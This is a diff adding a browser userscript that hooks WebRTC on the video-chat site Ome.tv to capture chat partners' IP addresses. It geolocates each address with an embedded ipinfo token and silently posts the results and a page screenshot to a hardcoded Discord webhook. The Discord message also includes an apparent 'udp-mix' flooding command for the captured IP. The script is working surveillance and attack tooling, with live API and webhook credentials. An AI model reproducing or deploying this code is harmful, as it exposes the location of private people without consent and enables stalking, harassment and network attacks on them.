@@ -1,0 +1,432 @@
+// ==UserScript==
+// @name         LR1 PULLER - Neon Green Cyberpunk Edition
+// @namespace    https://github.com/lr1
+// @version      2.1
+// @description  Advanced Ome.tv IP Puller with Neon Green Cyberpunk UI and silent Discord webhook
+// @author       lr1
+// @match        *://ome.tv/*
+// @grant        none
+// @run-at       document-start
+// ==/UserScript==
+
+const api_key = "e2bfc0786f8c00";
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1463849480721006705/yLR5clf5GJxXumRXGp8gcI45RL8uiETQznQjrU8bhmzAOX9UU8sHzTVtRFbWeMSqfTeP";
+
+window._currentIPData = null;
+window._lastDiscordSend = 0;
+window._sentIPs = new Set();
+window._screenshotInProgress = false;
+const ipv4InfoMap = new Map();
+
+// ====================== IP COLLECTION ======================
+window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection;
+window.RTCPeerConnection = function (...args) {
+  const pc = new window.oRTCPeerConnection(...args);
+  pc.oaddIceCandidate = pc.addIceCandidate;
+  pc.addIceCandidate = function (iceCandidate, ...rest) {
+    const fields = iceCandidate.candidate.split(" ");
+    const ip = fields[4];
+    const port = fields[5];
+    if (fields[7] === "srflx") {
+      AddGather(`${ip}:${port}`);
+      updateHTML(`<i class="fa-solid fa-spinner fa-spin"></i><span>Fetching IP details...</span>`);
+      gather(ip, port);
+    }
+    return pc.oaddIceCandidate(iceCandidate, ...rest);
+  };
+  return pc;
+};
+
+function AddGather(ipPort) {
+  const btn = document.getElementById('btn-check');
+  if (btn) btn.onclick = () => gather(ipPort.split(':')[0], ipPort.split(':')[1] || '');
+}
+
+function AddMap(loc) {
+  const btn = document.getElementById('btn-map');
+  if (btn) btn.onclick = () => openMap('https://maps.google.com/?q=' + loc);
+}
+
+function updateHTML(text) {
+  const info = document.getElementById("Info");
+  if (info) info.innerHTML = text;
+  const overlay = document.getElementById('omeTV-Puller');
+  if (overlay) {
+    overlay.classList.remove('ip-hit');
+    void overlay.offsetWidth;
+    overlay.classList.add('ip-hit');
+  }
+}
+
+function openMap(link) {
+  window.open(link, '_blank');
+}
+
+function isIPv6(ip) {
+  return ip.includes(":");
+}
+
+async function gather(ip, port = null) {
+  try {
+    const res = await fetch(`https://ipinfo.io/${ip}/json?token=${api_key}`);
+    const json = await res.json();
+    if (json.bogon) return;
+
+    AddMap(json.loc);
+
+    let ipv4 = ip, ipv6 = null;
+    if (isIPv6(ip)) {
+      ipv6 = ip;
+      try {
+        const r = await fetch("https://api.ipify.org?format=json");
+        ipv4 = (await r.json()).ip;
+      } catch(e){}
+    } else {
+      try {
+        const r = await fetch("https://api64.ipify.org?format=json");
+        ipv6 = (await r.json()).ip;
+      } catch(e){}
+    }
+
+    // Display info on the panel
+    let display = "";
+    if (ipv4) display += `<i class="fa-solid fa-network-wired"></i><span>IPv4: ${ipv4}${port ? ':'+port : ''}</span><br>`;
+    if (ipv6) display += `<i class="fa-solid fa-network-wired"></i><span>IPv6: ${ipv6}</span><br>`;
+
+    updateHTML(`
+      <i class="fa-solid fa-city"></i><span>${json.city || 'Unknown'}</span><br>
+      <i class="fa-solid fa-signs-post"></i><span>${json.region || 'Unknown'}</span><br>
+      <i class="fa-solid fa-ethernet"></i><span>${json.org || 'Unknown'}</span><br>
+      ${display}
+    `);
+
+    window._currentIPData = {
+      ipv4: ipv4,
+      ipv6: ipv6,
+      city: json.city || 'Unknown',
+      region: json.region || 'Unknown',
+      org: json.org || 'Unknown',
+      loc: json.loc || 'Unknown',
+      port: port
+    };
+
+    // Silent Discord send
+    sendToDiscordSilent();
+
+  } catch (e) {
+    console.error(e);
+  }
+}
+
+// ====================== SILENT DISCORD SENDING ======================
+async function sendToDiscordSilent() {
+  if (!window._currentIPData) return;
+
+  const key = `${window._currentIPData.ipv4}:${window._currentIPData.port || ''}`;
+  if (window._sentIPs.has(key)) return;
+
+  if (Date.now() - window._lastDiscordSend < 2500) {
+    await new Promise(r => setTimeout(r, 2500));
+  }
+
+  try {
+    const d = window._currentIPData;
+
+    const embed = {
+      title: "🟢 OMETV IP Captured",
+      color: 0x00ff9d,
+      description: `**${d.city}, ${d.region}**`,
+      fields: [
+        { name: "IPv4", value: d.ipv4 || "N/A", inline: true },
+        { name: "City", value: d.city, inline: true },
+        { name: "Region", value: d.region, inline: true },
+        { name: "ISP", value: d.org, inline: true },
+        { name: "UDP-MIX", value: `udp-mix ${d.ipv4} 200 80`, inline: false }
+      ],
+      timestamp: new Date().toISOString(),
+      footer: { text: "LR1 PULLER v2.1 • Neon Green Cyberpunk" }
+    };
+
+    const formData = new FormData();
+    const payload = {
+      content: `**New IP • ${d.city}, ${d.region}**`,
+      embeds: [embed]
+    };
+
+    const blob = await takeScreenshot().catch(() => null);
+    if (blob && blob.size > 200) {
+      formData.append('file', blob, 'screenshot.png');
+      payload.content += "\n📸 Screenshot attached";
+    }
+
+    formData.append('payload_json', JSON.stringify(payload));
+
+    const resp = await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
+
+    if (resp.ok) {
+      window._lastDiscordSend = Date.now();
+      window._sentIPs.add(key);
+      console.log(`%c[LR1 PULLER] IP successfully sent to Discord → ${d.ipv4}`, "color:#00ff9d; font-weight:bold");
+    }
+  } catch (e) {
+    console.error("Discord error:", e);
+  }
+}
+
+// ====================== SCREENSHOT ======================
+async function takeScreenshot() {
+  return new Promise(resolve => {
+    if (typeof html2canvas === "undefined") {
+      const s = document.createElement("script");
+      s.src = "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";
+      s.onload = () => takeScreenshotLogic(resolve);
+      s.onerror = () => resolve(null);
+      document.head.appendChild(s);
+    } else {
+      takeScreenshotLogic(resolve);
+    }
+  });
+}
+
+async function takeScreenshotLogic(resolve) {
+  try {
+    const canvas = await html2canvas(document.body, {
+      scale: 1.8,
+      useCORS: true,
+      backgroundColor: "#0a0f08",
+      onclone: (cloned) => {
+        cloned.querySelectorAll('video, [class*="right"], [class*="self"], [class*="local"]').forEach(el => {
+          if (el) el.style.display = "none";
+        });
+      }
+    });
+    const cropped = document.createElement("canvas");
+    cropped.width = canvas.width;
+    cropped.height = 1100;
+    cropped.getContext("2d").drawImage(canvas, 0, 0, canvas.width, 1100, 0, 0, canvas.width, 1100);
+    cropped.toBlob(b => resolve(b), "image/png", 0.92);
+  } catch (e) {
+    console.error(e);
+    resolve(null);
+  }
+}
+
+// ====================== OTHER FUNCTIONS ======================
+function copyIP() {
+  const info = document.getElementById("Info");
+  if (!info) return;
+  const match = info.innerText.match(/\b(?:\d{1,3}\.){3}\d{1,3}(?::\d+)?\b/);
+  if (match) {
+    navigator.clipboard.writeText(match[0]);
+    updateHTML(`<i class="fa-solid fa-copy"></i><span>IP copied to clipboard!</span>`);
+  }
+}
+
+function saveIPv4ToTxt() {
+  if (ipv4InfoMap.size === 0) {
+    updateHTML(`<i class="fa-solid fa-triangle-exclamation"></i><span>No IPs saved yet.</span>`);
+    return;
+  }
+  let text = "LR1 PULLER - Captured IPs\n\n";
+  ipv4InfoMap.forEach((info, ip) => {
+    text += `IPv4: ${ip}\nCity: ${info.city}\nRegion: ${info.region}\nISP: ${info.org}\n\n`;
+  });
+  const blob = new Blob([text], {type: "text/plain"});
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(blob);
+  a.download = `lr1-ips-${Date.now()}.txt`;
+  a.click();
+  updateHTML(`<i class="fa-solid fa-file-arrow-down"></i><span>IPs saved to TXT file!</span>`);
+}
+
+// ====================== NEON GREEN CYBERPUNK PANEL ======================
+function createPanel() {
+  const overlay = document.createElement('div');
+  overlay.id = 'omeTV-Puller';
+  overlay.innerHTML = `
+    <div id="header">
+      <div id="title">Ω <span>LR1</span> PULLER <span class="version">v2.1</span></div>
+      <div id="status"><i class="fa-solid fa-circle-check"></i> <span>ACTIVE</span></div>
+    </div>
+    <div id="controls">
+      <button id="btn-check"><i class="fa-solid fa-magnifying-glass"></i> Check IP</button>
+      <button id="btn-map"><i class="fa-solid fa-map-location-dot"></i> Open Map</button>
+      <button id="btn-copy"><i class="fa-solid fa-copy"></i> Copy IP</button>
+      <button id="btn-save"><i class="fa-solid fa-floppy-disk"></i> Save IPs (J)</button>
+      <button id="btn-screenshot"><i class="fa-solid fa-camera"></i> Screenshot (O)</button>
+    </div>
+    <div id="info-panel">
+      <div id="Info">
+        <i class="fa-solid fa-circle-check"></i>
+        <span>Neon Green Panel loaded • Drag the header</span>
+      </div>
+    </div>
+    <div id="footer">Made with <span class="heart">♥</span> by lr1 </div>
+    <canvas id="matrix"></canvas>
+  `;
+  document.body.appendChild(overlay);
+
+  // ====================== STYLES ======================
+  const style = document.createElement('style');
+  style.textContent = `
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&display=swap');
+    #omeTV-Puller {
+      position: fixed;
+      top: 50px;
+      left: 50px;
+      width: 430px;
+      background: rgba(8, 15, 10, 0.98);
+      border: 3px solid #00ff9d;
+      border-radius: 16px;
+      box-shadow: 0 0 25px #00ff9d, 0 0 50px rgba(0,255,157,0.6), inset 0 0 20px rgba(0,255,157,0.2);
+      z-index: 999999;
+      font-family: 'Orbitron', sans-serif;
+      color: #00ff9d;
+      overflow: hidden;
+      user-select: none;
+    }
+    #omeTV-Puller.ip-hit {
+      box-shadow: 0 0 40px #00ff41, 0 0 80px rgba(0,255,65,0.8);
+    }
+    #header {
+      background: linear-gradient(90deg, #001a0f, #003322);
+      padding: 16px 22px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 2px solid #00ff9d;
+      cursor: move;
+    }
+    #title {
+      font-size: 1.7rem;
+      font-weight: 700;
+      letter-spacing: 3px;
+      text-shadow: 0 0 15px #00ff9d, 0 0 30px #00ff41;
+    }
+    #title span { color: #00ff41; }
+    #controls {
+      padding: 18px 20px;
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+    }
+    #controls button {
+      background: rgba(0,255,157,0.08);
+      border: 2px solid #00ff9d;
+      color: #00ff9d;
+      padding: 14px;
+      border-radius: 10px;
+      font-size: 0.97rem;
+      cursor: pointer;
+      transition: all 0.25s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    #controls button:hover {
+      background: #00ff9d;
+      color: #001a0f;
+      transform: translateY(-3px) scale(1.03);
+      box-shadow: 0 0 20px #00ff9d;
+    }
+    #info-panel { padding: 0 20px 18px; }
+    #Info {
+      background: rgba(0,20,10,0.7);
+      border: 2px dashed #00ff9d88;
+      padding: 16px;
+      border-radius: 10px;
+      line-height: 1.6;
+      font-size: 0.98rem;
+    }
+    #footer {
+      text-align: center;
+      padding: 10px;
+      font-size: 0.82rem;
+      color: #00cc77;
+      border-top: 1px solid #003322;
+    }
+    .heart { color: #ff0066; animation: pulse 1.3s infinite; }
+    @keyframes pulse { 50% { opacity: 0.6; } }
+    canvas#matrix {
+      position: absolute;
+      inset: 0;
+      z-index: -1;
+      opacity: 0.18;
+      pointer-events: none;
+    }
+  `;
+  document.head.appendChild(style);
+
+  // ====================== MATRIX BACKGROUND ======================
+  const canvas = document.getElementById('matrix');
+  const ctx = canvas.getContext('2d');
+  let fontSize = 15, drops = [];
+
+  function resize() {
+    canvas.width = overlay.clientWidth;
+    canvas.height = overlay.clientHeight;
+    drops = Array(Math.floor(canvas.width / fontSize)).fill(1);
+  }
+
+  function draw() {
+    ctx.fillStyle = 'rgba(8,15,10,0.35)';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.font = fontSize + "px monospace";
+    for (let i = 0; i < drops.length; i++) {
+      const txt = "01ΩΔΣΨΦΓλμ0123456789@#$%^*()"[Math.floor(Math.random()*38)];
+      ctx.fillStyle = `rgba(0,255,157,${0.6 + Math.random() * 0.4})`;
+      ctx.fillText(txt, i * fontSize, drops[i] * fontSize);
+      if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+      drops[i]++;
+    }
+  }
+
+  resize();
+  setInterval(draw, 50);
+  window.addEventListener('resize', resize);
+
+  // ====================== DRAG & HOTKEYS ======================
+  const header = document.getElementById('header');
+  let isDragging = false, offsetX = 0, offsetY = 0;
+
+  header.addEventListener('mousedown', e => {
+    isDragging = true;
+    const rect = overlay.getBoundingClientRect();
+    offsetX = e.clientX - rect.left;
+    offsetY = e.clientY - rect.top;
+    overlay.style.transition = 'none';
+  });
+
+  document.addEventListener('mousemove', e => {
+    if (!isDragging) return;
+    overlay.style.left = (e.clientX - offsetX) + 'px';
+    overlay.style.top = (e.clientY - offsetY) + 'px';
+  });
+
+  document.addEventListener('mouseup', () => {
+    if (isDragging) {
+      isDragging = false;
+      overlay.style.transition = 'box-shadow 0.4s';
+    }
+  });
+
+  document.addEventListener('keydown', e => {
+    if (e.key.toLowerCase() === 'j') saveIPv4ToTxt();
+    if (e.key.toLowerCase() === 'o') {
+      if (!window._screenshotInProgress) {
+        window._screenshotInProgress = true;
+        takeScreenshot().finally(() => window._screenshotInProgress = false);
+      }
+    }
+  });
+
+  // Button actions
+  document.getElementById('btn-copy').onclick = copyIP;
+  document.getElementById('btn-save').onclick = saveIPv4ToTxt;
+  document.getElementById('btn-screenshot').onclick = () => document.dispatchEvent(new KeyboardEvent('keydown', {key: 'o'}));
+
+  console.log("%cLR1 PULLER v2.1 - Neon Green Cyberpunk Edition loaded! Use it wisely!", "color:#00ff9d; font-size:16px; font-family:Orbitron");
+}
+
+createPanel();
